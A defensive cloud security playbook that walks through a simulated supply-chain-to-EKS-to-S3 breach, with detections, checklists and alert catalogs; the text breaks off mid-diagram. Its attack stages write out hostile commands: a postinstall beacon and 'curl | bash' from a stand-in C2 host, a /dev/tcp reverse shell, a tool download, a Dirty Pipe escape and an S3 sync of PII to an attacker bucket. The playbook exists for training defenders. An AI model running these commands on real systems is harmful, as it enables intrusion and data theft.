# Cloud Security Complete Playbook
## Senior Cloud Incident Responder & CNAPP Security Architect

---

> **Document Coverage:** Enterprise Kubernetes Breach Simulation | Incident & Alert Catalog | CWPP & CSPM Deep Dive | 5 Real Scenarios | Interview Pitch
>
> **Tools Referenced:** CrowdStrike Falcon (CWPP, CSPM, CIEM, KAC) | AWS EKS | ArgoCD | GitHub Actions
>
> **Frameworks:** MITRE ATT&CK | NIST CSF | CIS Benchmarks | GDPR | HIPAA

---

# PART 1: ENTERPRISE KUBERNETES SECURITY BREACH SIMULATION

## Executive Threat Narrative

**Scenario:** A financially motivated threat actor (TTPs consistent with SCATTERED SPIDER / UNC3944 lineage) compromises a Fortune 500 retail company's AWS-hosted EKS production cluster. Entry point is a poisoned open-source dependency in the CI/CD pipeline. The attack spans 11 days from initial access to data exfiltration, touching 4 AWS accounts, 2 EKS clusters, and 37 IAM roles.

**Environment:**
- AWS multi-account (Landing Zone, hub-spoke model)
- EKS v1.28 with managed node groups (AL2 AMI)
- ArgoCD + GitHub Actions CI/CD
- Falco disabled post-migration (replaced by Falcon sensor — attacker didn't know this)
- 3 microservices namespaces: `payments`, `inventory`, `auth`

---

## Attack Stage 1: CI/CD Supply Chain Poisoning

### Attacker Intent

The attacker identifies that the company pulls a popular internal NPM package `@company/api-utils` from a private GitHub registry. They register a lookalike package name on the public NPM registry with a higher version number, exploiting dependency confusion. The malicious package contains a post-install script that beacons out and drops a lightweight stager into the build container.

### Attack Mechanics

```bash
# Malicious package.json post-install hook
"scripts": {
  "postinstall": "node -e \"require('https').get('https://c2.attacker[.]io/s?h='+require('os').hostname());\""
}

# Inside GitHub Actions runner (ubuntu-latest)
# Stager downloads a base64-encoded loader
curl -sk https://c2.attacker[.]io/l | base64 -d | bash
```

The loader enumerates GitHub Actions environment variables:
```bash
env | grep -E 'GITHUB_TOKEN|AWS_|ARGO|KUBECONFIG|SECRET'
```

It exfiltrates:
- `GITHUB_TOKEN` (org-scoped, not repo-scoped)
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (assume-role for ECR push)
- ArgoCD admin credentials stored as a plaintext Actions secret

### Detection Mechanism — Falcon CWPP + KAC

**Falcon Sensor on the Actions Runner (self-hosted):**
- Process lineage: `node → bash → curl → base64 → bash` — anomalous shell spawned from build tool
- Network IOC: first-seen external egress to `c2.attacker[.]io` from build infra
- `GITHUB_TOKEN` appears in process memory and is copied to a network socket (memory scraping detection)

**KAC — Policy Enforcement:**
- The poisoned image is pushed to ECR. When ArgoCD attempts to deploy it, KAC evaluates the image against the Falcon Image Assessment policy
- Image scan result: `CRITICAL` — embedded shell script, network call in layer diff
- KAC blocks the admission with: `AdmissionWebhook DENY — ImageAssessmentPolicy:UnscannedOrFailed`

### Telemetry Generated

```json
{
  "event_type": "ProcessRollup2",
  "ComputerName": "github-runner-prod-07",
  "ImageFileName": "/usr/bin/bash",
  "CommandLine": "bash -i >& /dev/tcp/c2.attacker.io/4444 0>&1",
  "ParentImageFileName": "/usr/local/bin/node",
  "ParentCommandLine": "node postinstall.js",
  "NetworkConnections": [{"RemoteAddressIP4": "185.220.xx.xx", "RemotePort": 4444}],
  "DetectionName": "SuspiciousChildProcess.BuildTool",
  "Severity": "High",
  "MITRE_Technique": "T1059.004"
}
```

**Falcon CSPM Alert:**
```
POLICY: GitHub Actions secret exposed in build log
RESOURCE: actions/workflow/deploy-payments.yml
FINDING: AWS_SECRET_ACCESS_KEY referenced in step output — not masked
SEVERITY: Critical
CIS_BENCHMARK: 4.1.1
```

### Why Traditional Tools Would Miss It

| Tool Type | Gap |
|---|---|
| SAST/DAST | Analyzes source code, not runtime behavior of build toolchain |
| ECR Vulnerability Scanning | Scans known CVEs, does not detect behavioral malware in layers |
| CloudTrail alone | Records API calls but not process-level behavior inside Actions runner |
| GitHub Advanced Security | Detects secret leakage in code, not in memory or network exfil |
| WAF/Network IDS | Encrypted HTTPS beacon; no signature match without TLS inspection |

### How Runtime Security Stopped It

Falcon CWPP's eBPF sensor on the self-hosted runner captures syscall-level telemetry. The `execve` chain from `node → bash → curl` triggers the "Suspicious Process Chain in Build Environment" behavioral detection. The KAC admission webhook prevents the tainted image from ever running in production. Even though CI/CD was compromised, the blast radius was contained at the Kubernetes boundary.

---

## Attack Stage 2: Container Runtime Compromise & Drift

### Attacker Intent

The `GITHUB_TOKEN` exfiltrated in Stage 1 had `packages:write` and `repo` scope (over-privileged — a CSPM finding that was open for 47 days). The attacker uses it to modify a legitimate workflow, injecting a sidecar into the `payments` deployment manifest that passes KAC (because it mimics a legitimate Datadog agent image name from a controlled ECR repo the attacker now has write access to).

### Attack Mechanics

The attacker pushes image `123456789.dkr.ecr.us-east-1.amazonaws.com/datadog-agent:7.43.1-PATCHED` — visually identical to prod. ArgoCD syncs. Container starts.

Inside the container, 3 minutes after start:
```bash
# Attacker drops tools post-start (container drift)
wget -q http://185.220.xx.xx/tools.tar.gz -O /tmp/.hidden/tools.tar.gz
tar -xzf /tmp/.hidden/tools.tar.gz -C /tmp/.hidden/
chmod +x /tmp/.hidden/pspy64 /tmp/.hidden/linpeas.sh /tmp/.hidden/chisel
```

Then attempts kernel exploitation for privilege escalation:
```bash
# CVE-2022-0847 (Dirty Pipe) attempt
/tmp/.hidden/dirtypipe /etc/passwd
# Followed by:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Detection Mechanism — Falcon CWPP Container Drift + Runtime Detection

**Container Drift Detection:**

Falcon establishes a golden image fingerprint at container start — a cryptographic inventory of every binary, library, and executable in the container filesystem. Any new file written post-start that wasn't in the original image layer is flagged as drift.

```
DRIFT ALERT:
Container: payments-7d4f9c-xk2p9
Namespace: payments
New executable written: /tmp/.hidden/pspy64
  SHA256: 3a7f1c... (known offensive tool)
New executable written: /tmp/.hidden/chisel
  SHA256: 9b2d4e... (known tunneling tool)
Detection: ContainerDrift.OffensiveToolDrop
Severity: Critical
```

**Runtime Detection — PotentialKernelTampering:**
```json
{
  "event_type": "KernelTampering",
  "DetectionName": "PotentialKernelTampering",
  "Description": "Process attempted to write to /proc/sysrq-trigger and modify kernel memory maps. Dirty Pipe exploitation pattern detected.",
  "ProcessImageFileName": "/tmp/.hidden/dirtypipe",
  "TargetFile": "/etc/passwd",
  "SyscallSequence": ["open(O_WRONLY)", "splice()", "write(pipe_offset=0)"],
  "ContainerID": "a3f7b291cc4e",
  "PodName": "payments-7d4f9c-xk2p9",
  "Severity": "Critical",
  "MITRE_Technique": "T1611"
}
```

**Interactive Intrusion Detection:**
```
ALERT: InteractiveContainerSession
  User: root (UID 0) spawned interactive shell
  Command: nsenter --target 1 --mount --uts --ipc --net --pid -- bash
  Effect: Container escape attempt to host namespace
  Detection: ContainerEscape.NsenterToHostNamespace
  Action: PREVENT (process killed, pod quarantined)
```

### Telemetry Generated

```
T+0:00  Container payments-7d4f9c-xk2p9 started
T+3:14  DNS query: 185.220.xx.xx (first seen domain)
T+3:16  wget spawned from entrypoint process (drift begins)
T+3:22  3 executables written to /tmp/.hidden/ (DRIFT EVENT)
T+3:45  dirtypipe executed — kernel exploit sequence (KERNEL TAMPER)
T+3:47  nsenter with host namespace flags (CONTAINER ESCAPE — BLOCKED)
T+3:47  Pod quarantined — network policy auto-applied
T+3:47  Falcon RTR session initiated (auto-response)
```

### Why Traditional Tools Would Miss It

- **Image scanning (Trivy, Snyk):** Scans original image. Drift tools were downloaded *after* container start — invisible to pre-deploy scanning
- **Kubernetes audit logs:** Record pod creation/deletion, not in-container file writes or syscall sequences
- **Network policies alone:** Cannot block intra-container file system operations or kernel exploit attempts
- **OPA/Gatekeeper:** Policy enforced at admission time, not runtime. Once the pod is running, OPA is blind
- **Node-level HIDS (OSSEC, AIDE):** Monitors host filesystem, not container overlay filesystems independently

### How Runtime Security Stopped It

Falcon's eBPF-based drift engine tracks every `write()` and `execve()` syscall against the immutable image manifest. The `PotentialKernelTampering` ML model fired before privilege escalation succeeded. The container escape prevention policy killed the `nsenter` process and triggered automated pod isolation via Kubernetes Network Policy injection through the Falcon operator.

---

## Attack Stage 3: IAM Privilege Escalation

### Attacker Intent

The `nsenter` was blocked, but the attacker already extracted the pod's service account token from the container environment before the kill:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# JWT with: system:serviceaccount:payments:payments-api-sa
```

The payments-api-sa service account has an IRSA (IAM Roles for Service Accounts) binding to `arn:aws:iam::123456789:role/payments-api-role`. This role has `iam:PassRole`, `sts:AssumeRole`, and `ec2:*` — a CSPM finding rated HIGH that had been open for 23 days.

### Attack Mechanics

```bash
# From attacker C2 — using extracted service account JWT against K8s API
curl -H "Authorization: Bearer <JWT>" https://k8s-api.internal/api/v1/secrets

# Lateral movement via IRSA
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789:role/payments-api-role \
  --web-identity-token <JWT> \
  --role-session-name "legitimate-app-session"
```

With `payments-api-role`, the attacker then enumerates and assumes additional roles:
```bash
# Enumerate assumable roles
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS)'

# Finds: payments-api-role can assume data-lake-admin-role
aws sts assume-role \
  --role-arn arn:aws:iam::999888777:role/data-lake-admin-role \
  --role-session-name "app-session"

# Now has: S3:*, Glue:*, Athena:*, LakeFormation:*
```

### Detection Mechanism — Falcon CIEM + CSPM

**CIEM Anomaly Detection:**
```
ALERT: AnomalousRoleAssumption
  Principal: payments-api-role
  AssumedRole: data-lake-admin-role
  SourceIP: 185.220.xx.xx (external — NOT a pod IP, NOT a VPC IP)
  UserAgent: aws-cli/2.x — NOT consistent with application SDK patterns
  Time: 02:47 UTC (outside business hours)
  BaselineDeviation: Role never assumed externally in 180-day history
  Confidence: 97%
  MITRE: T1078.004 (Valid Accounts: Cloud Accounts)
```

**CSPM Policy Violations:**
```
FINDING ID: CSPM-IAM-0441
  Title: IAM role with iam:PassRole and sts:AssumeRole grants excessive privilege
  Resource: payments-api-role
  Age: 23 days
  Severity: HIGH (now promoted to CRITICAL — actively exploited)

FINDING ID: CSPM-IAM-0119
  Title: Cross-account role assumption without MFA or IP condition
  Resource: data-lake-admin-role trust policy
  Remediation: Add aws:SourceVpc or aws:MultiFactorAuthPresent condition
```

**CIEM Effective Permission Analysis:**
```
Effective blast radius of payments-api-sa compromise:
  Direct permissions: EC2:*, S3:GetObject (payments bucket)
  Via PassRole chain:
    → data-lake-admin-role: S3:* (ALL buckets), Glue:*, Athena:*
    → logging-shipper-role: CloudTrail:DeleteTrail, CloudTrail:StopLogging ← CRITICAL
  Total sensitive permissions: 847
  Data stores accessible: 23 S3 buckets, 4 RDS instances, 2 Redshift clusters
```

### Telemetry Generated

CloudTrail events correlated in Falcon Insight:
```json
[
  {"eventName": "AssumeRoleWithWebIdentity", "sourceIPAddress": "185.220.xx.xx", "userAgent": "aws-cli/2.13"},
  {"eventName": "AssumeRole", "requestParameters": {"roleArn": "data-lake-admin-role"}, "sourceIPAddress": "185.220.xx.xx"},
  {"eventName": "ListBuckets", "sourceIPAddress": "185.220.xx.xx"},
  {"eventName": "GetBucketPolicy", "requestParameters": {"bucketName": "prod-customer-pii-lake"}},
  {"eventName": "StopLogging", "requestParameters": {"name": "prod-cloudtrail"}, "errorCode": "AccessDenied"}
]
```

### Why Traditional Tools Would Miss It

- **GuardDuty:** Would flag `UnauthorizedAccess:IAMUser/TorIPCaller` but misses the subtle role chaining pattern and the IRSA-external-IP anomaly correlation
- **CloudTrail alone:** Shows events but no behavioral baseline — no way to know `185.220.xx.xx` is attacker vs. new legitimate origin without UEBA
- **IAM Access Analyzer:** Shows resource policies and external access, not runtime anomalous assumption patterns
- **SIEM without cloud context:** Correlates events but lacks the CIEM effective permissions graph — can't determine blast radius in real time

### How Runtime Security Stopped It

Falcon CIEM's identity graph had pre-computed the complete effective permission set for `payments-api-sa`, including all transitive role assumption paths. When the external-IP assumption fired, CIEM correlated it with the active container incident (same JWT, same role ARN) creating a unified attack timeline. Falcon Fusion automated response:

1. Revoked the IRSA binding (modified the IAM role trust policy to add `aws:SourceVpc` condition)
2. Tagged the role as compromised in AWS Config
3. Triggered an SCP block on `data-lake-admin-role` assumption from external IPs
4. Notified the SOC with full blast radius visualization

---

## Attack Stage 4: Lateral Movement & Data Exfiltration

### Attacker Intent

Before the SCP blocked them, the attacker exfiltrated 47GB of customer PII from the `prod-customer-pii-lake` S3 bucket using `aws s3 sync` to an attacker-controlled S3 bucket in a separate AWS org. They also attempted to move laterally into the second EKS cluster (staging) via a misconfigured cross-cluster IAM trust.

### Attack Mechanics

```bash
# Exfiltration via S3 API
aws s3 sync s3://prod-customer-pii-lake/ s3://attacker-bucket-us-east-1/ \
  --no-progress --quiet

# Cross-cluster lateral movement
kubectl --server=https://staging-k8s-api --token=<JWT> get secrets -A
```

### Detection

**Falcon CSPM — S3 Data Exfiltration:**
```
ALERT: S3.LargeVolumeExternalTransfer
  Source: prod-customer-pii-lake
  Destination: 987654321.s3.amazonaws.com (external AWS account, not in org)
  Volume: 47.3 GB in 4 minutes
  API calls: s3:GetObject × 892,441
  Principal: data-lake-admin-role/app-session
  Correlation: LINKED to active IAM compromise incident INC-2024-0847
```

**CIEM — aws-auth Misconfiguration:**
```
CSPM FINDING: K8S-AUTH-0012
  Title: IAM role mapped to cluster-admin in non-production cluster
  Resource: aws-auth ConfigMap, cluster: staging-eks-01
  Mapped Role: payments-api-role → system:masters
  Risk: Any principal assuming payments-api-role has cluster-admin on staging
  Age: 67 days
```

---

## MITRE ATT&CK Complete Mapping

| Stage | Technique ID | Technique Name | Sub-technique |
|---|---|---|---|
| CI/CD Poisoning | T1195.001 | Supply Chain Compromise | Compromise Software Dependencies |
| CI/CD Poisoning | T1552.001 | Unsecured Credentials | Credentials in Files (env vars) |
| Container Drift | T1608.001 | Stage Capabilities | Upload Malware |
| Kernel Exploit | T1611 | Escape to Host | — |
| Kernel Exploit | T1068 | Exploitation for Privilege Escalation | — |
| IAM Escalation | T1078.004 | Valid Accounts | Cloud Accounts |
| IAM Escalation | T1548.005 | Abuse Elevation Control | Temporary Elevated Cloud Access |
| Role Chaining | T1550.001 | Use Alternate Auth Material | Application Access Token |
| Defense Evasion | T1562.008 | Impair Defenses | Disable Cloud Logs (attempted) |
| Lateral Movement | T1021.007 | Remote Services | Cloud Services |
| Exfiltration | T1537 | Transfer Data to Cloud Account | — |
| Discovery | T1526 | Cloud Service Discovery | — |

---

## NIST CSF Mapping

| CSF Function | Category | Finding | Gap |
|---|---|---|---|
| **Identify** | ID.AM-2 | Software inventory didn't include transitive NPM deps | SBOM incomplete |
| **Identify** | ID.RA-1 | IAM over-privilege known for 23-67 days, not remediated | Risk acceptance process broken |
| **Protect** | PR.AC-4 | IRSA roles lacked source IP/VPC conditions | IAM hardening gap |
| **Protect** | PR.DS-5 | S3 bucket lacked object-level logging + DLP tagging | Data protection gap |
| **Protect** | PR.IP-3 | CI/CD pipeline had no dependency pinning or registry isolation | Supply chain control gap |
| **Detect** | DE.CM-3 | No UEBA baseline on IRSA external assumptions | Detection coverage gap |
| **Respond** | RS.RP-1 | Incident response playbook didn't cover IRSA compromise | Playbook gap |
| **Recover** | RC.RP-1 | No tested runbook for EKS cluster quarantine | Recovery gap |

---

## Defensive Control Improvements

### 1. CI/CD Hardening

```yaml
# GitHub Actions: Pin dependencies, use private registry only
- name: Setup Node
  uses: actions/setup-node@v3  # pinned by SHA in production
  with:
    registry-url: 'https://npm.your-company.internal'

# Enforce: npm install --ignore-scripts (block postinstall hooks)
# Use: Sigstore/cosign for artifact signing on every build
# Implement: Dependency confusion protection via scope isolation
```

### 2. IAM Least Privilege (CIEM-Guided Remediation)

```json
{
  "Condition": {
    "StringEquals": {
      "aws:SourceVpc": "vpc-0a1b2c3d4e5f"
    },
    "Bool": {
      "aws:SecureTransport": "true"
    }
  }
}
```

### 3. KAC Policies

```yaml
# Policies to enforce:
# - readOnlyRootFilesystem: true
# - allowPrivilegeEscalation: false
# - runAsNonRoot: true
# - seccompProfile: RuntimeDefault
# - No hostPID, hostNetwork, hostIPC
# - Image must pass Falcon scan (no CRITICAL findings)
# - Image must be signed (cosign verify)
```

### 4. Runtime Policy: Container Drift Prevent Mode

```
Falcon Prevention Policy:
  ContainerDrift: PREVENT (kill any new executable not in original image)
  InteractiveShell: PREVENT (block tty allocation in non-debug containers)
  KernelExploitMitigation: PREVENT
  NamespaceEscape: PREVENT
  SuspiciousKernelModule: PREVENT
```

### 5. Network Segmentation

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payments-deny-all
  namespace: payments
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
  # Only allow explicit ingress from API gateway
  # Only allow egress to payments-db service and AWS APIs via VPC endpoint
  # Block ALL direct internet egress from pods
```

---

## SOC L2 Investigation Checklist

### Phase 1: Triage & Scope (0–30 minutes)

```
□ Confirm Falcon detection chain — link CID to impacted host/container/account
□ Pull full process tree from Falcon Insight (72-hour lookback)
□ Identify: container name, pod name, namespace, node, cluster, AWS account
□ Check: Is drift detection in Prevent or Detect-only? (if Detect-only, assume breach)
□ Pull all network connections from affected container (source/dest, first-seen timestamps)
□ Identify service account JWT — get IAM role ARN from IRSA annotation
□ Run CIEM blast radius query: "What can this role access?"
□ Check CloudTrail: Has the role been used from external IPs in last 7 days?
□ Check: Has the role assumed other roles? (AssumeRole events, cross-account)
□ Determine data sensitivity of all accessible S3 buckets (check Macie tags)
```

### Phase 2: Containment (30–90 minutes)

```
□ Quarantine pod (delete + apply blocking NetworkPolicy via Falcon Fusion or kubectl)
□ Revoke IRSA: Modify trust policy to deny all (or add impossible condition temporarily)
□ Rotate service account JWT: Delete and recreate Kubernetes ServiceAccount
□ Invalidate all active STS sessions for compromised role: use IAM policy deny with date condition
□ Check aws-auth ConfigMap in ALL clusters for the compromised role — remove or restrict
□ Enable S3 Object Lock on PII buckets (prevent further exfil)
□ Check for any new IAM users, access keys, or roles created in last 24h
□ Check for CloudTrail deletion/modification attempts — restore if needed
□ Enable GuardDuty findings export to Falcon if not already active
□ Notify Privacy/Legal if S3 exfil confirmed (GDPR 72h clock starts)
```

### Phase 3: Investigation (90 minutes – 24 hours)

```
□ Reconstruct full attack timeline from:
  - Falcon process telemetry (CWPP)
  - CloudTrail (all regions, all accounts)
  - Kubernetes audit logs (API server)
  - VPC Flow Logs
  - S3 server access logs (GetObject events)
□ Determine initial access vector: Review CI/CD logs for postinstall execution
□ Pull NPM audit log / package-lock.json from compromised build
□ Identify all packages downloaded in the 7 days before detection
□ Check all GitHub Actions runs that used the poisoned dependency
□ Determine dwell time: When was first beacon to C2?
□ Quantify exfiltrated data: Correlate S3 GetObject events with destination
□ Check for persistence mechanisms:
  - New Kubernetes CronJobs, DaemonSets
  - New Lambda functions (via Terraform or console)
  - New IAM roles with console access
  - New EC2 instances / ECS tasks
□ Check all ECR repos for tampered images (compare digests against pipeline artifacts)
```

---

## Cloud Forensics Checklist

### Evidence Preservation

```bash
# Snapshot EBS volumes of affected nodes IMMEDIATELY
aws ec2 create-snapshot --volume-id vol-xxxx --description "forensic-INC-2024-0847"

# Preserve CloudTrail logs — copy to isolated forensic S3 bucket with Object Lock
aws s3 sync s3://cloudtrail-bucket/ s3://forensic-evidence-bucket/ --sse aws:kms

# Export Kubernetes audit logs from CloudWatch Logs to S3
aws logs create-export-task --log-group-name /aws/eks/prod/cluster --destination forensic-bucket

# Capture container memory snapshot via Falcon RTR
# RTR Command: memdump --pid <pid> --output /tmp/forensic/

# Preserve pod filesystem (before termination)
kubectl cp payments/payments-7d4f9c-xk2p9:/tmp/.hidden/ ./forensic/dropped-tools/

# Export IAM credential report
aws iam generate-credential-report && aws iam get-credential-report

# Export all CloudTrail events for compromised role ARN (all regions)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=payments-api-role
```

### Analysis Artifacts

```
□ Reconstruct dropped binary behavior (sandbox detonation of pspy64, chisel, dirtypipe)
□ Extract C2 IOCs from network telemetry: IPs, domains, JA3 hashes, HTTP paths
□ Reverse IRSA JWT: decode claims, verify audience, identify scope
□ Analyze S3 exfil: reconstruct data types transferred via S3 Object metadata
□ Timeline correlation: merge all log sources into unified timeline (use Timesketch or Falcon Investigate)
□ Threat intel enrichment: Submit C2 IPs/domains/hashes to Falcon Intel
□ Determine if attacker used LOTL (Living off the Land) techniques exclusively
□ Check for rootkit persistence: Compare running processes vs /proc, check loaded kernel modules
```

---

## Interview-Ready Storytelling Version

*"We had an incident that started as a dependency confusion attack against our CI/CD pipeline and evolved into a multi-account AWS compromise. What made it interesting was how the attacker was technically patient and precise — they never triggered a single GuardDuty finding for the first three days.*

*The entry point was a poisoned NPM package. Our build pipeline was pulling an internal package by name, and the attacker registered the same name on public NPM with a higher version number. The post-install hook beaconed out and stole our GitHub Actions token — which, unfortunately, was scoped too broadly.*

*What's important here is why traditional tooling missed it: our SAST tools analyzed source code, not the behavior of build dependencies. Our ECR scanner looked for CVEs, not malicious scripts embedded in package lifecycle hooks. And our SIEM had no behavioral baseline for what 'normal' looked like inside a GitHub Actions runner.*

*Falcon CWPP caught it because we had the sensor on our self-hosted runners. The process lineage — node spawning bash spawning curl — was flagged immediately as a suspicious build-tool child process. And when that tainted image was pushed to ECR, the Kubernetes Admission Controller blocked its deployment because image assessment failed. The attacker's initial foothold was cut off at the Kubernetes boundary.*

*But they pivoted. They used the extracted service account JWT externally, outside our VPC, to assume the pod's IAM role via IRSA. This is where CIEM became critical. Our IRSA roles didn't have source VPC conditions — a known CSPM finding that had been sitting open for 23 days. The attacker discovered they could chain roles — our payments API role could assume a data lake admin role in another account. Falcon CIEM had pre-computed the full effective permissions graph, so when the anomalous external assumption fired, we instantly knew the blast radius: 23 S3 buckets, 4 RDS instances, two Redshift clusters.*

*The attacker managed to exfiltrate 47 gigabytes before our automated response — triggered by Falcon Fusion — modified the IAM trust policy and applied a Service Control Policy block. We contained it in under 11 minutes from detection to IAM revocation.*

*The three lessons we drove into our roadmap: First, every IRSA role now has a source VPC condition — non-negotiable, enforced by a preventative CSPM policy. Second, CI/CD is production infrastructure, and we treat it that way — Falcon sensors on all runners, dependency pinning by SHA, and no postinstall scripts allowed in the build. Third, CIEM blast radius analysis is now part of our IAM PR review process — every new role gets a 'what if this is compromised' effective-permissions review before it ships.*

*The business outcome was hard. We had a mandatory breach notification to 47,000 customers under GDPR. But the forensic evidence we preserved — the process telemetry, the CloudTrail correlation, the container memory dumps — was complete enough that we could tell regulators exactly what was accessed, when, and by what mechanism. That specificity is only possible with a runtime security stack that captures at the syscall level."*

---

## Summary Architecture Diagram

```
ATTACK FLOW                          DETECTION LAYER
─────────────────────────────────────────────────────────────────

[Attacker] ──NPM Confusion──► [CI/CD Runner] ◄── Falcon CWPP (process chain)
                                     │
                              [ECR: Tainted Image]◄── Falcon Image Assessment
                                     │
                              [KAC Admission Webhook]──BLOCK──►[Pod Denied]
                                     │(bypass via direct JWT use)
[Attacker] ──IRSA JWT (ext)──► [AWS STS] ◄─────── Falcon CIEM (external IP anomaly)
                                     │
                              [payments-api-role]
                                     │  (role chain)
                              [data-lake-admin-role] ◄── CSPM (cross-account trust)
                                     │
                              [S3 PII Buckets] ◄────── CSPM (exfil volume alert)
                                     │
                         [47GB ──► Attacker S3] ◄──── Macie + CSPM correlation

AUTOMATED RESPONSE:
  Falcon Fusion ──► Revoke IRSA trust ──► Apply SCP ──► Quarantine pod ──► Alert SOC
```

---

# PART 2: INCIDENTS & ALERTS CATALOG

## Cloud Infrastructure Incidents

### AWS-Specific

- IMDS v1 credential theft (EC2 metadata abuse → IAM pivot)
- S3 bucket misconfiguration leading to PII exposure
- Lambda function injection via environment variable manipulation
- ECS task role abuse for cross-account movement
- RDS snapshot exfiltration via cross-account copy
- CloudFormation stack poisoning (IaC supply chain)
- VPC peering misrouting enabling unauthorized lateral movement
- Route53 subdomain takeover

### Multi-Cloud

- GCP service account key exfiltration from GCS buckets
- Azure Managed Identity abuse in AKS pods
- Cross-cloud data bridge attacks (AWS → GCP via federated identity)

---

## Kubernetes-Specific Incidents

| Incident Type | Entry Vector | Key Alert |
|---|---|---|
| Privileged pod escape | Misconfig / weak PSP | ContainerEscape.PrivilegedMount |
| etcd direct access | Exposed port 2379 | UnauthorizedAPIAccess.etcd |
| Kubelet API abuse | Port 10250 unauthenticated | KubeletAnonymousAuth |
| Service mesh bypass | Istio sidecar injection failure | mTLS policy violation |
| Secrets enumeration | Over-privileged service account | K8s API audit: list secrets |
| DaemonSet persistence | Cluster-admin compromise | PersistentDaemonSet.Suspicious |
| Webhook poisoning | MutatingWebhook hijack | AdmissionWebhook.TamperAttempt |
| Node affinity abuse | Scheduling to unprotected nodes | UnusualNodeScheduling |

---

## Runtime Detection Alerts (Falcon CWPP Pattern Recognition)

### Process & Execution Alerts

```
- SuspiciousChildProcess.WebServer       (webshell activity)
- SuspiciousChildProcess.BuildTool       (CI/CD compromise)
- PotentialKernelTampering               (CVE-2022-0847, CVE-2021-4154)
- InteractiveContainerSession            (attacker tty allocation)
- ContainerDrift.OffensiveToolDrop       (chisel, mimikatz, pspy)
- CryptominingActivity.XMRig            (resource hijack)
- ReverseTCPShell                        (bash -i >& /dev/tcp)
- PythonPTY.InteractiveShell            (python -c 'import pty; pty.spawn')
- Base64EncodedCommandExecution          (obfuscation)
- SuspiciousLDPreload                    (library injection)
- LD_PRELOAD rootkit persistence
- /proc/mem write attempts               (direct memory manipulation)
```

### Network-Based Alerts

```
- BeaconLikeTraffic.PeriodicC2           (Cobalt Strike/Sliver pattern)
- DNSTunneling.HighEntropySubdomain      (iodine, dnscat2)
- TorExitNodeCommunication
- UnusualPortScan.FromContainer
- LargeVolumeExternalTransfer (S3/network)
- FirstSeenExternalDomain.BuildInfra
```

---

## IAM / Identity Incidents

### Alert Patterns

- `AssumeRoleWithWebIdentity` from external IP — IRSA abuse
- Privilege escalation via `iam:CreatePolicyVersion` (replacing managed policy)
- `iam:PassRole` + Lambda:CreateFunction = instant privilege escalation to any role
- STS session token reuse across regions (credential portability abuse)
- Console login after long dormancy (stale access key weaponization)
- Shadow admin creation — attacker creates new user/role before getting detected
- OIDC provider manipulation in EKS (trust policy widening)
- Cross-account role chaining 3+ hops deep (hard to trace without CIEM graph)

### CIEM Alerts

```
- AnomalousRoleAssumption.ExternalIP
- UnusedPrivilegeExercised.FirstTime     (permissions used for first time ever)
- BlastRadiusExpansion.RoleChain
- ShadowAdminDetected.PolicyAttach
- CredentialExposure.GitHubActions
- ServiceAccountTokenExternalUse
```

---

## CI/CD & Supply Chain Incidents

- Dependency confusion (NPM/PyPI/RubyGems)
- Typosquatting packages with C2 callbacks
- GitHub Actions secret exposure via `echo` in workflow steps
- ArgoCD CVE-2022-24348 (path traversal → secret extraction)
- Terraform state file exfiltration (stored credentials)
- Jenkins RCE via Groovy script console (exposed without auth)
- Container image tag mutability abuse (`:latest` poisoning)
- Build cache poisoning in multi-stage Docker builds

---

## CSPM Alert Categories

### AWS

```
- S3 bucket public access (object/bucket level)
- Security Group: 0.0.0.0/0 on port 22/3389/443
- IMDSv1 enabled (no token requirement)
- CloudTrail: logging disabled, no log file validation
- KMS: key rotation disabled
- RDS: publicly accessible, no encryption at rest
- EKS: public API server endpoint, no envelope encryption
- ECS: task role with admin-level permissions
- Lambda: environment variables contain secrets in plaintext
- IAM: root account active access keys
- IAM: no MFA on console users
- IAM: inline policies instead of managed (shadow permissions)
```

---

## Threat Actor TTP Reference

| Actor / Group | Primary Cloud TTP | Key Indicator |
|---|---|---|
| TeamTNT | Cryptomining via exposed Docker API | XMRig drop, Docker API scan |
| SCATTERED SPIDER | Social engineering → Okta → cloud pivot | Identity federation abuse |
| Rocke Group | K8s cryptominer via Helm chart | Suspicious cron in container |
| APT29 (Cozy Bear) | M365 → AAD → Azure abuse | OAuth token persistence |
| LightBasin (UNC1945) | Telecom cloud pivot | SLAPSTICK passive implant pattern |
| Lace Tempest | MOVEit → cloud exfil | Cl0p ransomware precursor TTPs |

---

## Alert Fatigue Patterns

| Alert Type | Classification | Guidance |
|---|---|---|
| IMDSv1 enabled | False positive heavy | Often legacy apps — needs context before actioning |
| First-seen domain from build infra | High volume, high signal | Never suppress — correlate with process chain |
| CSPM findings over 30 days old | Organizational debt | Create auto-escalation SLA policy |
| Single `AssumeRole` from new IP | Correlation-required | Benign alone, critical with drift alert |
| InteractiveContainerSession in debug NS | Suppressed incorrectly | Time-limit suppression, never permanent |

---

## The Correlation Principle

```
LOW    → New NPM package pulled in build (informational)
MEDIUM → Outbound connection from runner to unknown domain
MEDIUM → Container drift: binary written to /tmp
HIGH   → PotentialKernelTampering in container
CRITICAL → IRSA role assumed from external IP
CRITICAL → Cross-account role chain to data lake
CRITICAL → 47GB S3 transfer to external account

Individually: manageable
Together: breach notification to 47,000 customers
```

---

# PART 3: CWPP & CSPM — DEEP TECHNICAL EXPLANATION

## CWPP — Cloud Workload Protection Platform

### What It Actually Is

CWPP is the **runtime guardian**. It lives *inside* your workloads — on the host, inside the container, on the VM. It watches what is happening right now, at the process and syscall level.

Think of CWPP as a **detective embedded inside the building** who watches every person's behavior in real time — what they pick up, where they walk, who they talk to.

### How Falcon CWPP Works Technically

```
ARCHITECTURE:

┌─────────────────────────────────────────────────┐
│              LINUX HOST / EC2 NODE              │
│                                                 │
│  ┌──────────────────┐   ┌────────────────────┐  │
│  │   Container A    │   │   Container B      │  │
│  │  (payments-api)  │   │  (nginx-proxy)     │  │
│  └──────────────────┘   └────────────────────┘  │
│                                                 │
│  ┌───────────────────────────────────────────┐  │
│  │         Falcon Sensor (eBPF-based)        │  │
│  │                                           │  │
│  │  Hooks into:                              │  │
│  │  - execve() → every process execution    │  │
